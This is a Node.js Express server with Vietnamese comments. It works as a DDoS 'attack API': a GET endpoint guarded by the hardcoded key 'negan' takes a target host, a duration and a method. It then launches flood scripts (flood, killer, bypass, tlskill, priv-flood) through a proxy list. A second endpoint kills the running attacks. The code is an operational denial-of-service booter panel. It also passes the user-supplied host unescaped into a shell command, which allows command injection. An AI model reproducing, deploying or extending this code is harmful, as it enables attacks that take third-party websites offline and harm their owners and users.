const express = require("express");
const { exec } = require("child_process");
const axios = require("axios");

const app = express();
const port = 9999;

const maxConcurrentAttacks = 10;
let activeAttacks = 0;

// Lấy IP công cộng
const getPublicIP = async () => {
  try {
    const { data } = await axios.get('https://api.ipify.org?format=json');
    return data.ip;
  } catch (error) {
    console.error('Không thể lấy IP công cộng:', error);
    return 'N/A';
  }
};

// Kiểm tra dữ liệu đầu vào
const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "Thiếu tham số yêu cầu";
  if (key !== "negan") return "Invalid Key";
  if (time > 300) return "Thời gian phải nhỏ hơn 300 giây";
  if (port < 1 || port > 65535) return "Cổng không hợp lệ";
  if (!["flood", "killer", "bypass", "tlskill", "priv-flood"].includes(method.toLowerCase())) {
    return "Phương thức không hợp lệ";
  }
  return null;
};

// Thực thi lệnh tấn công
const executeAttack = (command, clientIP) => {
  exec(command, (error, stdout, stderr) => {
    if (stderr) console.error(stderr);
    console.log(`[${clientIP}] Lệnh [${command}] đã được thực thi thành công.`);
    activeAttacks--;
  });
};

// Lấy PID của tiến trình
const getPidsByProcess = (process) => {
  return new Promise((resolve, reject) => {
    exec(`pgrep -f ${process}`, (error, stdout, stderr) => {
      if (stderr || error) reject(stderr || error);
      resolve(stdout.trim().split("\n"));
    });
  });
};

// Dừng tiến trình
const killProcess = (process) => {
  return new Promise((resolve, reject) => {
    exec(`pkill -f -9 ${process}`, (error, stdout, stderr) => {
      if (stderr || error) reject(stderr || error);
      console.log(`Đã dừng tiến trình ${process}`);
      resolve();
    });
  });
};

// Xử lý các tiến trình và trả về danh sách PID đã dừng
const pkillProcesses = async () => {
  const processes = ["flood", "killer", "bypass", "tlskill", "priv-flood"];
  let pidList = [];

  for (let process of processes) {
    try {
      const pids = await getPidsByProcess(process);
      pidList.push(...pids);
      await killProcess(process);
    } catch (err) {
      console.error(`Lỗi khi xử lý tiến trình ${process}: ${err}`);
    }
  }

  return pidList;
};

// API tấn công
app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port } = req.query;
  const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage) return res.status(400).json({ status: "error", message: validationMessage });

  if (activeAttacks >= maxConcurrentAttacks) {
    return res.status(400).json({ status: "error", message: "Đã đạt giới hạn tấn công đồng thời" });
  }

  activeAttacks++;

  // Tạo lệnh tấn công dựa trên phương thức
  const commands = {
    "flood": `node --max-old-space-size=65536 flood ${host} ${time} 10 10 live.txt flood`,
    "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
    "bypass": `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`,
    "tlskill": `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`,
    "priv-flood": `node --max-old-space-size=65536 priv-flood -m GET -u ${host} -s ${time} -p live.txt --ratelimit true --full true`
  };

  const command = commands[method.toLowerCase()];
  if (!command) {
    return res.status(400).json({ status: "error", message: "Phương thức tấn công không hợp lệ" });
  }

  executeAttack(command, clientIP);
  res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method });
});

// API pkill
app.get("/api/pkill", async (req, res) => {
  const { pkill } = req.query;

  if (pkill === "true") {
    try {
      const pidList = await pkillProcesses();
      res.status(200).json({
        status: "success",
        message: "Đã dừng tất cả các tiến trình tấn công.",
        pids: pidList.join(", ")
      });
    } catch (error) {
      res.status(500).json({ status: "error", message: "Lỗi khi dừng tiến trình", error });
    }
  } else {
    res.status(400).json({ status: "error", message: "Tham số pkill không hợp lệ." });
  }
});

// Khởi động server
getPublicIP().then((ip) => {
  app.listen(port, () => {
    console.log(`[Máy chủ API] đang chạy trên > ${ip}:${port}`);
  });
}).catch((err) => {
  console.error("Không thể lấy IP công cộng:", err);
});
